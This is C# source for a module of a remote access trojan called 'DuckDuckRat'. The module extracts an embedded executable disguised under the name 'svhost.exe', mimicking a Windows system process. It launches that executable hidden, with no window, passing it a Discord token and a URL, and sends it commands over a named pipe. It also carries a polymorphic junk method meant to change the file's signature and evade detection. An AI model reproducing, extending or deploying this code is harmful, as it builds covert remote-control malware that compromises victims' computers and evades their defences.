using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using DuckDuckRat;
using DuckDuckRat.Modules;
using System.IO.Pipes;

namespace DuckDuckRat.Modules
{
    public static class DiscordRemoteManager
    {
        // [POLY_JUNK]
        private static void _DuckDuckRat_addd76dc() {
            int val = 70307;
            if (val > 50000) Console.WriteLine("Hash:" + 70307);
        }

        public static string LaunchDiscordBot(string token, string url, string action = "join")
        {
            try
            {
                string workDir = ResourceModule.WorkDir;
                string tempExe = Path.Combine(workDir, "svhost.exe");

                if (!File.Exists(tempExe))
                {
                    Console.WriteLine("[DISCORD_REMOTE] svhost.exe missing. Extracting from resources...");
                    ResourceModule.ExtractAll();
                }

                if (!File.Exists(tempExe)) return "❌ Ошибка: Сервис svhost.exe не найден в " + tempExe;

                if (action != "join")
                {
                    SendPipeCommand(action);
                    return $"⚡ Команда `{action}` отправлена через Pipe.";
                }

                // Launch the WebView2 EXE with new flags
                Process.Start(new ProcessStartInfo
                {
                    FileName = tempExe,
                    Arguments = $"--token \"{token}\" --url \"{url}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    WorkingDirectory = workDir
                });

                return $"✅ Discord Pro запущен (svhost.exe). Инициализация WebView2...";
            }
            catch (Exception ex)
            {
                return $"❌ Ошибка запуска Discord: {ex.Message}";
            }
        }

        private static void SendPipeCommand(string cmd)
        {
            try
            {
                using (var pipeClient = new NamedPipeClientStream(".", "DUCK DUCK RAT v1_discord_cmd", PipeDirection.Out))
                {
                    pipeClient.Connect(1000);
                    using (var writer = new StreamWriter(pipeClient))
                    {
                        writer.Write(cmd);
                        writer.Flush();
                    }
                }
            }
            catch { }
        }
    }
}


